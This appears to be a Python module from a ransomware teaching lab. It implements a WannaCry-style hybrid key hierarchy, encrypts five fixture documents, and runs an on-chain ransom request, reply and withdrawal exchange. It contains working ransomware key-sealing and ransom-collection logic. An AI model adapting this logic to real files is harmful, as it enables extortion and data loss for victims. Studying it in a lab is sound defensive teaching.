#!/usr/bin/env python3
"""Layered ransomware key logic for the five generated lab samples.

This module implements the WannaCry-style key hierarchy as a teaching model:

  1. attacker_priv / attacker_pub   created only on the attacker machine.
                                     attacker_pub travels inside the worm;
                                     attacker_priv never leaves that machine.
  2. On each victim host, payload execution generates victim_priv / victim_pub.
     victim_priv is sealed under attacker_pub (hybrid AES-GCM + RSA-OAEP) and
     stored locally; victim_pub stays in plaintext locally.
  3. One symmetric AES-256-GCM file key encrypts all five samples. The file key
     is sealed under victim_pub and stored locally.

Decryption chain: attacker_priv -> victim_priv -> file key -> files. No victim
key material in plaintext on disk is ever needed by the chain itself.

For the blockchain exchange, a separate ephemeral X25519 keypair is generated
per request. The victim posts (ephemeral_pub, sealed victim_priv) on-chain;
the attacker decrypts victim_priv offline and replies with victim_priv and the
file key sealed under the ECDH shared key. This is a per-request channel, not a
third persistent keypair. Ethereum wallet keys are unrelated to this module.

The scenario stays limited to the five exact generated fixture documents, as
the rest of the lab does. It is a reversible lab demonstration, not a general
file encryptor.
"""

import argparse
import base64
import hashlib
import json
import os
from pathlib import Path
import tempfile

from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding, rsa, x25519
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives.kdf.hkdf import HKDF

from file_generator import FILES


SAMPLES = {name: text.encode("utf-8") for name, text in FILES.items()}
MAGIC = b"Y04LAB1\n"
NONCE_SIZE = 12
TAG_SIZE = 16
RSA_BITS = 2048

DEFAULT_KEYLOG = Path("/opt/wannacry-v2/lab_keylogic.json")
DEFAULT_ATTACKER = Path("/opt/wannacry-v2/attacker_keys.json")


def b64(data: bytes) -> str:
    return base64.b64encode(data).decode("ascii")


def unb64(text: str) -> bytes:
    return base64.b64decode(text.encode("ascii"))


def write_atomic(path: Path, data: bytes):
    """Replace one file after flushing its complete new contents to disk."""
    handle, temporary = tempfile.mkstemp(dir=path.parent, prefix=".lab-")
    try:
        with os.fdopen(handle, "wb") as stream:
            stream.write(data)
            stream.flush()
            os.fsync(stream.fileno())
        os.replace(temporary, path)
        directory = os.open(path.parent, os.O_RDONLY)
        try:
            os.fsync(directory)
        finally:
            os.close(directory)
    finally:
        if os.path.exists(temporary):
            os.unlink(temporary)


def write_json(path: Path, value: dict, private: bool = False):
    """Save JSON with the same atomic replacement, optionally owner-only."""
    if private:
        old_umask = os.umask(0o077)
        try:
            write_atomic(path, (json.dumps(value, indent=2) + "\n").encode("utf-8"))
        finally:
            os.umask(old_umask)
        os.chmod(path, 0o600)
    else:
        write_atomic(path, (json.dumps(value, indent=2) + "\n").encode("utf-8"))


def new_rsa_keypair():
    """Generate an RSA-2048 keypair (attacker or victim)."""
    private = rsa.generate_private_key(public_exponent=65537, key_size=RSA_BITS)
    return private


def priv_pem_from(private) -> bytes:
    return private.private_bytes(
        serialization.Encoding.PEM,
        serialization.PrivateFormat.PKCS8,
        serialization.NoEncryption(),
    )


def pub_pem(public) -> bytes:
    return public.public_bytes(
        serialization.Encoding.PEM,
        serialization.PublicFormat.SubjectPublicKeyInfo,
    )


def load_priv_pem(pem: bytes):
    return serialization.load_pem_private_key(pem, password=None)


def load_pub_pem(pem: bytes):
    return serialization.load_pem_public_key(pem)


def seal_with_rsa_pub(public, plaintext: bytes) -> dict:
    """Seal arbitrary bytes to one RSA public key.

    An ephemeral AES-256-GCM key encrypts the payload; that AES key is wrapped
    with RSA-OAEP-SHA256 under the given public key. Only the matching private
    key can open the seal.
    """
    aes_key = AESGCM.generate_key(bit_length=256)
    nonce = os.urandom(NONCE_SIZE)
    ciphertext = AESGCM(aes_key).encrypt(nonce, plaintext, None)
    wrapped = public.encrypt(
        aes_key,
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None,
        ),
    )
    return {"wrap": b64(wrapped), "nonce": b64(nonce), "ct": b64(ciphertext)}


def unseal_with_rsa_priv(private, sealed: dict) -> bytes:
    """Open a seal produced by seal_with_rsa_pub with the matching private key."""
    aes_key = private.decrypt(
        unb64(sealed["wrap"]),
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None,
        ),
    )
    return AESGCM(aes_key).decrypt(unb64(sealed["nonce"]), unb64(sealed["ct"]), None)


# --------------------------------------------------------------------------
# Attacker side (their own machine, never a victim host)
# --------------------------------------------------------------------------

def create_attacker_keys(path: Path = DEFAULT_ATTACKER) -> Path:
    """Create the attacker keypair once. attacker_priv stays in this file."""
    if path.exists():
        raise ValueError("attacker keys already exist; refusing to overwrite")
    private = new_rsa_keypair()
    record = {
        "role": "attacker",
        "attacker_priv_pem": b64(priv_pem_from(private)),
        "attacker_pub_pem": pub_pem(private.public_key()).decode("ascii"),
    }
    write_json(path, record, private=True)
    print(f"attacker keypair created: {path}")
    print("attacker_pub (copy into the worm payload):")
    print(record["attacker_pub_pem"])
    return path


def attacker_open_victim_priv(attacker_priv_pem: bytes, keylog: dict) -> bytes:
    """Offline: use attacker_priv to unseal the victim's private key.

    Returns victim_priv PEM. The sealed blob is useless to anyone without this
    attacker private key; the attacker never needs to touch the victim host.
    """
    attacker_priv = load_priv_pem(attacker_priv_pem)
    keylog_pub = load_pub_pem(keylog["attacker_pub_pem"].encode("ascii"))
    own_pub = load_priv_pem(attacker_priv_pem).public_key()
    if keylog_pub.public_numbers() != own_pub.public_numbers():
        raise ValueError("keylog was sealed under a different attacker key")
    return unseal_with_rsa_priv(attacker_priv, keylog["victim_priv_sealed"])


# --------------------------------------------------------------------------
# Victim side (payload execution)
# --------------------------------------------------------------------------

def payload_exec(
    target: Path,
    participant_id: str,
    attacker_pub_pem: bytes,
    keylog_path: Path = DEFAULT_KEYLOG,
):
    """Run the payload key sequence on one victim host.

    1. Generate victim_priv / victim_pub; seal victim_priv under attacker_pub.
    2. Generate one AES-256-GCM file key for all samples.
    3. Encrypt every sample with that file key and a fresh nonce.
    4. Seal the file key under victim_pub.
    5. Store everything in the keylog; plaintext key material exists only
       transiently in memory.
    """
    if keylog_path.exists():
        raise ValueError("keylog already exists; this host was already processed")
    attacker_pub = load_pub_pem(attacker_pub_pem)

    victim_priv = new_rsa_keypair()
    victim_priv_pem = priv_pem_from(victim_priv)
    victim_pub_pem = pub_pem(victim_priv.public_key())

    victim_priv_sealed = seal_with_rsa_pub(attacker_pub, victim_priv_pem)

    file_key = AESGCM.generate_key(bit_length=256)
    file_key_sealed = seal_with_rsa_pub(victim_priv.public_key(), file_key)

    record = {
        "participant_id": participant_id,
        "attacker_pub_pem": attacker_pub_pem.decode("ascii"),
        "victim_pub_pem": victim_pub_pem.decode("ascii"),
        "victim_priv_sealed": victim_priv_sealed,
        "file_key_sealed": file_key_sealed,
        "files": {},
    }
    for name, data in SAMPLES.items():
        nonce = os.urandom(NONCE_SIZE)
        context = f"{participant_id}/{name}".encode("utf-8")
        record["files"][name] = {
            "nonce": b64(nonce),
            "ciphertext": b64(AESGCM(file_key).encrypt(nonce, data, context)),
        }
    write_json(keylog_path, record, private=True)

    for name in SAMPLES:
        write_atomic(
            target / name,
            MAGIC
            + unb64(record["files"][name]["nonce"])
            + unb64(record["files"][name]["ciphertext"]),
        )
    return record


def victim_open_file_key(victim_priv_pem: bytes, keylog: dict) -> bytes:
    """After the exchange: unseal the file key with the recovered victim_priv."""
    victim_priv = load_priv_pem(victim_priv_pem)
    keylog_pub = load_pub_pem(keylog["victim_pub_pem"].encode("ascii"))
    if keylog_pub.public_numbers() != victim_priv.public_key().public_numbers():
        raise ValueError("recovered victim key does not match this keylog")
    return unseal_with_rsa_priv(victim_priv, keylog["file_key_sealed"])


def recover_samples(
    file_key: bytes,
    target: Path,
    participant_id: str,
    keylog: dict,
    state_file: Path = Path("/opt/wannacry-v2/participant.json"),
):
    """Decrypt the five samples with the opened file key and verify baselines.

    Note: this lab knows the original plaintext hashes through participant.json
    (kept by prepare_participant.py), so recovery can verify itself. In a real
    incident the victim could not do that without the originals.
    """
    record = json.loads(state_file.read_text(encoding="utf-8"))
    baseline = record["original_hashes"]

    for name in SAMPLES:
        entry = keylog["files"][name]
        nonce = unb64(entry["nonce"])
        context = f"{participant_id}/{name}".encode("utf-8")
        plain = AESGCM(file_key).decrypt(nonce, unb64(entry["ciphertext"]), context)
        digest = hashlib.sha256(plain).hexdigest()
        if digest != baseline.get(name):
            raise ValueError(f"recovered sample does not match its baseline: {name}")
        write_atomic(target / name, plain)
    print(f"{participant_id}: {len(SAMPLES)} documents recovered and verified")


# --------------------------------------------------------------------------
# Blockchain exchange (ephemeral channel, not a third persistent keypair)
# --------------------------------------------------------------------------

def build_exchange_request(keylog: dict) -> dict:
    """Victim side: build the on-chain request payload.

    The victim generates an ephemeral X25519 keypair for this request only.
    The sealed victim_priv blob is copied from the keylog; it is inert without
    attacker_priv. A production system would sign this message with the
    participant's Ethereum wallet key (lab_wallet.py) to authenticate it, but
    the wallet key never encrypts file material.
    """
    ephemeral = x25519.X25519PrivateKey.generate()
    request = {
        "participant_id": keylog["participant_id"],
        "ephemeral_pub_b64": b64(
            ephemeral.public_key().public_bytes(
                serialization.Encoding.Raw,
                serialization.PublicFormat.Raw,
            )
        ),
        "victim_priv_sealed": keylog["victim_priv_sealed"],
        "attacker_pub_fingerprint": hashlib.sha256(
            keylog["attacker_pub_pem"].encode("ascii")
        ).hexdigest()[:16],
    }
    # The ephemeral private key exists only while the request is open; in a
    # lab run it is kept in the keylog for the reply step. Keep it local.
    request["_ephemeral_priv_b64"] = b64(
        ephemeral.private_bytes(
            serialization.Encoding.Raw,
            serialization.PrivateFormat.Raw,
            serialization.NoEncryption(),
        )
    )
    return request


def _ecdh_channel(own_priv_x25519, peer_pub_raw: bytes) -> bytes:
    """Derive an AES key from X25519 shared secret via HKDF-SHA256."""
    peer = x25519.X25519PublicKey.from_public_bytes(peer_pub_raw)
    shared = own_priv_x25519.exchange(peer)
    return HKDF(
        algorithm=hashes.SHA256(),
        length=32,
        salt=None,
        info=b"y04-keylogic-exchange",
    ).derive(shared)


def attacker_build_reply(request: dict, victim_priv_pem: bytes, file_key: bytes) -> dict:
    """Attacker side: seal the recovered material to the victim's ephemeral key.

    The reply is the on-chain payload that only the requesting victim host can
    open, because only it holds the ephemeral private key from step one.
    """
    ephemeral = x25519.X25519PrivateKey.generate()
    reply_key = _ecdh_channel(
        ephemeral, unb64(request["ephemeral_pub_b64"])
    )
    reply_pub_raw = ephemeral.public_key().public_bytes(
        serialization.Encoding.Raw, serialization.PublicFormat.Raw
    )
    nonce = os.urandom(NONCE_SIZE)
    payload = json.dumps(
        {"victim_priv_pem": victim_priv_pem.decode("ascii"), "file_key": b64(file_key)}
    ).encode("utf-8")
    return {
        "participant_id": request["participant_id"],
        "reply_pub_b64": b64(reply_pub_raw),
        "nonce": b64(nonce),
        "ct": b64(AESGCM(reply_key).encrypt(nonce, payload, None)),
    }


def save_exchange_request(keylog: dict, path: Path) -> dict:
    """Victim side: build and persist the exchange request.

    The returned dict is what goes on the chain: it contains only public data
    plus the inert sealed blob. The ephemeral private key is stored locally
    beside the keylog so the reply can be opened; it lives only for this
    exchange and is never shared.
    """
    request = build_exchange_request(keylog)
    ephemeral_priv_b64 = request.pop("_ephemeral_priv_b64")
    local = dict(request, ephemeral_priv_b64=ephemeral_priv_b64)
    write_json(path, local, private=True)
    return request


def victim_accept_reply(request_path: Path, reply: dict) -> dict:
    """Victim side: open the attacker's reply with the saved ephemeral key."""
    saved = json.loads(request_path.read_text(encoding="utf-8"))
    ephemeral = x25519.X25519PrivateKey.from_private_bytes(
        unb64(saved["ephemeral_priv_b64"])
    )
    channel = _ecdh_channel(ephemeral, unb64(reply["reply_pub_b64"]))
    payload = AESGCM(channel).decrypt(unb64(reply["nonce"]), unb64(reply["ct"]), None)
    opened = json.loads(payload)
    return {
        "victim_priv_pem": opened["victim_priv_pem"].encode("ascii"),
        "file_key": unb64(opened["file_key"]),
    }


def run_recovery_step(target: Path, state_file: Path, lab_dir: Path, password: str = None):
    """One UI-driven step of the exchange and recovery walk-through.

    Called from the ransomware demand screen (option 5). Each call performs
    the next legal step and explains what must happen on which machine:

      1. Before any payload: instruct how to execute the payload.
      2. No exchange yet: build the on-chain request (ephemeral X25519 key +
         the inert sealed victim_priv blob). When a wallet and the chain
         config exist, register it on-chain with real payment; the manual
         file-copy path remains the fallback otherwise.
      3. exchange_reply.json present (posted by the attacker on-chain, or
         dropped back by the attacker side): accept it, unseal the file key,
         recover the documents.
    """
    keylog_path = lab_dir / "lab_keylogic.json"
    request_path = lab_dir / "exchange_request.json"
    reply_path = lab_dir / "exchange_reply.json"
    accepted_path = lab_dir / "accepted.json"

    if not keylog_path.exists():
        raise ValueError(
            "no keylog yet: run the payload first with "
            "python3 /opt/wannacry-v2/lab_keylogic.py payload "
            "--target /home/seed/import_folder"
        )
    keylog = json.loads(keylog_path.read_text(encoding="utf-8"))

    if reply_path.exists():
        reply = json.loads(reply_path.read_text(encoding="utf-8"))
        opened = victim_accept_reply(request_path, reply)
        write_json(accepted_path, {
            "victim_priv_pem_b64": b64(opened["victim_priv_pem"]),
            "file_key_b64": b64(opened["file_key"]),
        }, private=True)
        print("Attacker reply accepted; file key unsealed with recovered victim key.")
        recover_samples(
            opened["file_key"],
            target,
            keylog["participant_id"],
            keylog,
            state_file,
        )
        return

    if not request_path.exists():
        on_chain = save_exchange_request(keylog, request_path)
        print("EXCHANGE REQUEST (this is the payload that goes on the chain):")
        print(json.dumps(on_chain, indent=2))

    wallet_file = lab_dir / "wallet.json"
    config_file = lab_dir / "chain.json"
    # A registered request has its on-chain id saved in the request file.
    # In that state this step must NEVER register again: the payment already
    # happened, and a second registration would pay a second ransom.
    already_registered = (
        json.loads(request_path.read_text(encoding="utf-8")).get("request_id")
        is not None
    )

    if wallet_file.exists() and config_file.exists() and (password or already_registered):
        # Real transport: one signed, paid registration transaction, then
        # on-chain polling for the attacker reply.
        import lab_ransom_chain

        config = json.loads(config_file.read_text(encoding="utf-8"))
        try:
            if already_registered:
                request = json.loads(request_path.read_text(encoding="utf-8"))
                print(f"payment already made; waiting for the on-chain reply "
                      f"to request {request['request_id']} (no new payment)...")
                reply = lab_ransom_chain.wait_reply(config, request["request_id"])
                reply_path.write_text(json.dumps(reply, indent=2) + "\n", encoding="utf-8")
                print(f"attacker reply received on-chain; saved to {reply_path}")
            else:
                lab_ransom_chain.victim_exchange(
                    config, wallet_file, password, request_path, lab_dir
                )
        except (OSError, RuntimeError, TimeoutError) as error:
            print(f"\nOn-chain exchange unavailable: {error}")
            print("Falling back to the manual copy path. Current instructions:")
        else:
            reply = json.loads(reply_path.read_text(encoding="utf-8"))
            opened = victim_accept_reply(request_path, reply)
            write_json(accepted_path, {
                "victim_priv_pem_b64": b64(opened["victim_priv_pem"]),
                "file_key_b64": b64(opened["file_key"]),
            }, private=True)
            print("Attacker reply accepted; file key unsealed with recovered victim key.")
            recover_samples(
                opened["file_key"],
                target,
                keylog["participant_id"],
                keylog,
                state_file,
            )
            return

    print("\nNext: on the attacker machine run the reply step with the attacker")
    print("keys, then copy the reply output to:")
    print(f"  {reply_path}")
    print("Then choose document recovery again to accept and decrypt.")


# --------------------------------------------------------------------------
# Command-line driver for the lab walkthrough
# --------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument(
        "action",
        choices=[
            "init-attacker", "payload", "request", "reply", "accept", "recover",
            "watch", "withdraw",
        ],
    )
    parser.add_argument("--target", type=Path, default=Path("/home/seed/import_folder"))
    parser.add_argument("--participant-id", default="as180-host_0")
    parser.add_argument("--keylog", type=Path, default=DEFAULT_KEYLOG)
    parser.add_argument("--attacker-keys", type=Path, default=DEFAULT_ATTACKER)
    parser.add_argument("--chain-key", type=Path, default=None,
                        help="attacker on-chain account JSON (private_key)")
    parser.add_argument("--rpc-url", default=None, help="attacker-side chain RPC")
    parser.add_argument("--utility-url", default=None, help="contract info server")
    parser.add_argument("--ransom-wei", type=int, default=10**18)
    parser.add_argument("--state-file", type=Path,
                        default=Path("/opt/wannacry-v2/participant.json"))
    parser.add_argument("--in", dest="in_path", type=Path, default=None)
    parser.add_argument("--out", dest="out_path", type=Path, default=None)
    args = parser.parse_args()

    if args.action == "init-attacker":
        create_attacker_keys(args.attacker_keys)
        return

    if args.action == "payload":
        attacker_keys = json.loads(args.attacker_keys.read_text(encoding="utf-8"))
        payload_exec(
            args.target,
            args.participant_id,
            attacker_keys["attacker_pub_pem"].encode("ascii"),
            args.keylog,
        )
        print(f"payload executed; keylog: {args.keylog}")
        return

    if args.action == "watch":
        import lab_ransom_chain
        if not (args.chain_key and args.rpc_url and args.utility_url):
            raise SystemExit(
                "watch needs --chain-key, --rpc-url, --utility-url "
                "(plus --attacker-keys and --keylog for the offline crypto)"
            )
        config = {
            "chain_id": 18000,
            "rpc_url": args.rpc_url,
            "utility_url": args.utility_url,
            "contract_name": "RansomExchange",
            "ransom_wei": args.ransom_wei,
        }
        results = lab_ransom_chain.attacker_watch(
            config, args.attacker_keys, args.chain_key, args.keylog
        )
        print(json.dumps(results, indent=2) if results else "no unanswered requests")
        return

    if args.action == "withdraw":
        import lab_ransom_chain
        if not (args.chain_key and args.rpc_url and args.utility_url):
            raise SystemExit("withdraw needs --chain-key, --rpc-url, --utility-url")
        config = {
            "chain_id": 18000,
            "rpc_url": args.rpc_url,
            "utility_url": args.utility_url,
            "contract_name": "RansomExchange",
            "ransom_wei": args.ransom_wei,
        }
        tx_hash = lab_ransom_chain.withdraw(config, args.chain_key)
        print(f"ransoms swept: {tx_hash}")
        return

    if args.action == "request":
        keylog = json.loads(args.keylog.read_text(encoding="utf-8"))
        on_chain = save_exchange_request(
            keylog, args.keylog.parent / "exchange_request.json"
        )
        print(json.dumps(on_chain, indent=2))
        return

    if args.action == "reply":
        if not args.in_path:
            raise SystemExit("reply needs --in request.json")
        attacker_keys = json.loads(args.attacker_keys.read_text(encoding="utf-8"))
        keylog = json.loads(args.keylog.read_text(encoding="utf-8"))
        victim_priv_pem = attacker_open_victim_priv(
            unb64(attacker_keys["attacker_priv_pem"]), keylog
        )
        file_key = victim_open_file_key(victim_priv_pem, keylog)
        request = json.loads(args.in_path.read_text(encoding="utf-8"))
        reply = attacker_build_reply(request, victim_priv_pem, file_key)
        print(json.dumps(reply, indent=2))
        return

    if args.action == "accept":
        if not args.in_path or not args.out_path:
            raise SystemExit("accept needs --in reply.json and --out accepted.json")
        reply = json.loads(args.in_path.read_text(encoding="utf-8"))
        opened = victim_accept_reply(
            args.keylog.parent / "exchange_request.json", reply
        )
        write_json(args.out_path, {
            "victim_priv_pem_b64": b64(opened["victim_priv_pem"]),
            "file_key_b64": b64(opened["file_key"]),
        }, private=True)
        print(f"exchange accepted; recovered material saved to {args.out_path}")
        return

    if args.action == "recover":
        if not args.in_path:
            raise SystemExit("recover needs --in accepted.json")
        accepted = json.loads(args.in_path.read_text(encoding="utf-8"))
        keylog = json.loads(args.keylog.read_text(encoding="utf-8"))
        recover_samples(
            unb64(accepted["file_key_b64"]),
            args.target,
            keylog["participant_id"],
            keylog,
            args.state_file,
        )


if __name__ == "__main__":
    main()
